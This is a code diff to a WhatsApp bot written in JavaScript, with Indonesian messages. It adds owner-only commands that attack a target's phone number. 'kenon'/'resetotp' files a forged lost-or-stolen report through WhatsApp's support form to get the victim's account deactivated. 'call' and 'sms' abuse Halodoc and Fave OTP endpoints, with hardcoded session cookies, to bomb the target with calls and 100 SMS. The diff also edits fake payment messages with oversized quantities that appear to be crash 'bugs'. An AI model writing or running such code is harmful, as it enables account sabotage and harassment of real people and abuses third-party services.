@@ -213,8 +213,8 @@ key: {
          },
 'message': {
 "interactiveMessage": {
-"header": {
-						
+"body": {
+"text": `${ownername}`,
 "hasMediaAttachment": [],
 "jpegThumbnail": thumb,
 },
@@ -222,7 +222,7 @@ key: {
 "buttons": [
 				{
 "name": "review_and_pay",
-"buttonParamsJson": `{"currency":"IDR","total_amount":{"value":2023,"offset":100},"reference_id": "","order":{"status": "completed","items":[{"retailer_id": "","name":"💖𝙎𝙃𝙄𝙉𝘾𝙃𝘼𝙉 メ 𝙒𝙄𝘽𝙐𝙎𝙊𝙁𝙏💖","amount":{"value":10000,"offset":100},"quantity":7777777}]}}`
+"buttonParamsJson": '{"currency":"IDR","total_amount":{"value":2023,"offset":100},"reference_id": "6348642505244872","order":{"status": "completed","items":[{"retailer_id": "6348642505244872","name": "","amount":{"value":10000,"offset":100},"quantity":7777777}]}}'
 }
 ]
 }
@@ -246,25 +246,26 @@ const fpayment = {
 const shinuwu = { 
 key: {
 fromMe: false,
-            participant: `7777777@s.whatsapp.net`,
+            participant: ``,
             ...(from ? {
-               remoteJid: `7777777@s.whatsapp.net`
+               remoteJid: `0@s.whatsapp.net`
             } : {})
          },
          message: {
-	"interactiveMessage": {
-						"header": {
-						"title": "ShinChan",
-						"subtitle": "Jumlah 1"
-					},
-						"nativeFlowMessage": {
+"interactiveMessage": {
+"body": {
+"text": `${ownername}`,
+"hasMediaAttachment": [],
+"jpegThumbnail": thumb,
+},
+"nativeFlowMessage": {
 "buttons": [
 				{
-					"name": "review_and_pay",
-					"buttonParamsJson": `{"currency":"IDR","total_amount":{"value":2023,"offset":100},"reference_id": "","order":{"status": "completed","items":[{"retailer_id": "","name":"💖𝙎𝙃𝙄𝙉𝘾𝙃𝘼𝙉 メ 𝙒𝙄𝘽𝙐𝙎𝙊𝙁𝙏💖","amount":{"value":10000,"offset":100},"quantity":7777777}]}}`
+"name": "review_and_pay",
+"buttonParamsJson": '{"currency":"IDR","total_amount":{"value":2023,"offset":100},"reference_id": "6348642505244872","order":{"status": "completed","items":[{"retailer_id": "6348642505244872","name": "","amount":{"value":10000,"offset":100},"quantity":7777777}]}}'
 }
 ]
-			}
+}
 }}}
 //===================SHINCHAN XD=========================//
 if (vn) {
@@ -2588,7 +2589,205 @@ await shinuwu.quoted.copyNForward(m.chat, true)
 }
 break
 //END REPEAT
+case 'unbanned': {
+if (!isCreator) return
+if (m.quoted || q) {
+var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
+var targetnya = tosend.split('@')[0]
 
+try {
+var axioss = require('axios')
+let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
+let cookie = ntah.headers["set-cookie"].join("; ")
+const cheerio = require('cheerio');
+let $ = cheerio.load(ntah.data)
+let $form = $("form");
+let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
+let form = new URLSearchParams()
+form.append("jazoest", $form.find("input[name=jazoest]").val())
+form.append("lsd", $form.find("input[name=lsd]").val())
+form.append("step", "submit")
+form.append("country_selector", "+")
+form.append("phone_number", `+${targetnya}`,)
+form.append("email", email.data[0])
+form.append("email_confirm", email.data[0])
+form.append("platform", "ANDROID")
+form.append("your_message", `Halo admin WhatsApp, saya mohon buka kembali akun WhatsApp saya +${targetnya} karena saya tidak melakukan spam, saat ini mungkin akun WhatsApp saya sedang di retas oleh orang yang tidak bertanggung jawab dan melakukan pelanggaran. Saya mohon untuk membuka kembali Akun WhatsApp saya agar bisa digunakan kembali karena sangat penting. Terimakasih`)
+form.append("__user", "0")
+form.append("__a", "1")
+form.append("__csr", "")
+form.append("__req", "8")
+form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
+form.append("dpr", "1")
+form.append("__ccg", "UNKNOWN")
+form.append("__rev", "1007965968")
+form.append("__comment_req", "0")
+
+let res = await axioss({
+url,
+method: "POST",
+data: form,
+headers: {
+cookie
+}
+
+})
+reply(`Tunggu 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp🥰💖`)
+let payload = String(res.data)
+if (payload.includes(`"payload":true`)) {
+reply(`##- WhatsApp Support -##
+
+Halo,
+
+Terima kasih telah menghubungi kami.
+
+Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.
+
+Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.
+
+Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk
+
+mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
+} else if (payload.includes(`"payload":false`)) {
+reply(`##- WhatsApp Support -##
+
+Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
+} else reply(util.format(res.data))
+} catch (err) {reply(`${err}`)}
+} else reply('Masukkan nomor target!')
+}
+break
+//=================================================//
+case 'resetotp': case 'kenon': {
+if (!isCreator) return
+if (m.quoted || q) {
+var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
+var targetnya = tosend.split('@')[0]
+
+try {
+var axioss = require('axios')
+let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
+let cookie = ntah.headers["set-cookie"].join("; ")
+const cheerio = require('cheerio');
+let $ = cheerio.load(ntah.data)
+let $form = $("form");
+let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
+let form = new URLSearchParams()
+form.append("jazoest", $form.find("input[name=jazoest]").val())
+form.append("lsd", $form.find("input[name=lsd]").val())
+form.append("step", "submit")
+form.append("country_selector", "+")
+form.append("phone_number", `+${targetnya}`,)
+form.append("email", email.data[0])
+form.append("email_confirm", email.data[0])
+form.append("platform", "ANDROID")
+form.append("your_message", `Perdido/roubado: desative minha conta`)
+form.append("__user", "0")
+form.append("__a", "1")
+form.append("__csr", "")
+form.append("__req", "8")
+form.append("__hs", "19574.BP:whatsapp_www_pkg.2.0.0.0.0")
+form.append("dpr", "1")
+form.append("__ccg", "UNKNOWN")
+form.append("__rev", "1007982238")
+form.append("__comment_req", "0")
+
+let res = await axioss({
+url,
+method: "POST",
+data: form,
+headers: {
+cookie
+}
+
+})
+let payload = String(res.data)
+if (payload.includes(`"payload":true`)) {
+reply(`##- WhatsApp Support -##
+
+Hai,
+
+ Terima kasih atas pesan Anda.
+
+ Kami telah menonaktifkan akun WhatsApp Anda.  Ini berarti akun Anda telah di keluarkan maka untuk sementara dinonaktifkan dan akan dihapus secara otomatis dalam 30 hari jika Anda tidak mendaftarkan ulang akun tersebut.  Harap dicatat: Tim Dukungan Pelanggan WhatsApp tidak dapat menghapus akun Anda secara manual.
+
+ Selama periode penonaktifan:
+
+ • Kontak Anda di WhatsApp mungkin masih melihat nama dan gambar profil Anda.
+ • Setiap pesan yang mungkin dikirim oleh kontak Anda ke
+
+ akun akan tetap dalam status tertunda hingga 30 hari.
+
+ Jika Anda ingin mendapatkan kembali akun Anda, daftarkan ulang akun Anda sebagai
+
+ secepatnya.  Daftar ulang akun Anda dengan memasukkan 6 digit
+
+ kode yang Anda terima melalui SMS atau panggilan telepon.  Jika Anda mendaftar ulang
+
+ pulihkan riwayat obrolan Anda di: Android |  iPhone.
+
+ file, cadangan, atau riwayat panggilan dari akun yang dihapus.
+
+ akun sebelum dihapus, Anda akan tetap berada di semua obrolan grup.  Anda akan memiliki opsi untuk memulihkan data Anda.  Pelajari caranya Jika Anda tidak mendaftarkan ulang akun Anda, akun tersebut mungkin akan dihapus dan proses ini tidak dapat dibatalkan.  Sayangnya, WhatsApp tidak dapat membantu Anda memulihkan obrolan, dokumen, media
+
+ Catatan: Jika perangkat Anda hilang atau dicuri, sebaiknya hubungi penyedia seluler Anda untuk memblokir kartu SIM Anda sesegera mungkin.  Memblokir kartu SIM Anda mencegah orang lain mendaftar dan mengakses akun yang terkait dengan kartu SIM.
+
+ Sumber daya terkait:
+
+ ⚫ Untuk informasi lebih lanjut tentang penonaktifan akun pada ponsel yang hilang dan dicuri, silakan baca artikel ini.
+
+ ⚫ Pelajari tentang akun yang dicuri di artikel ini.
+
+ Jika Anda memiliki pertanyaan atau masalah lain, jangan ragu untuk menghubungi kami.  Kami akan dengan senang hati membantu!`)
+} else if (payload.includes(`"payload":false`)) {
+reply(`##- WhatsApp Support -##
+
+Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
+} else reply(util.format(res.data))
+} catch (err) {reply(`${err}`)}
+} else reply('Masukkan nomor target!')
+}
+break
+//=================================================//
+case "call":
+if (!isCreator) return m.reply('*khusus Premium*')
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6281214281312`)
+let nosend = "+" + text.split("|")[0].replace(/[^0-9]/g, '')
+if (args[0].startsWith(`+6281214281312`)) return reply('Tidak bisa call ke nomor ini!')
+axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
+break
+//=================================================
+case 'sms': {
+if (!isCreator) return m.reply('*khusus Premium*')
+const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
+if (m.quoted || text) {
+if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
+let nosms = '+' + froms.replace('@s.whatsapp.net', '')
+let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
+let ua = mal[Math.floor(Math.random() * mal.length)];
+let axios = require('axios').default;
+let hd = {
+'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
+};
+const dat = {
+'phone': nosms
+};
+for (let x = 0; x < 100; x++) {
+axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
+headers: hd
+}).then(res => {
+console.log(res);
+}).catch(err => {
+console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) SHINCHAN SENPAI`);
+});
+}
+} else reply(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +6281214281312`)
+m.reply(`spam sms/call akan di kirim ke no target`)
+}
+break
+//=================================================//
 
 default:
 if (budy.startsWith('=>')) {
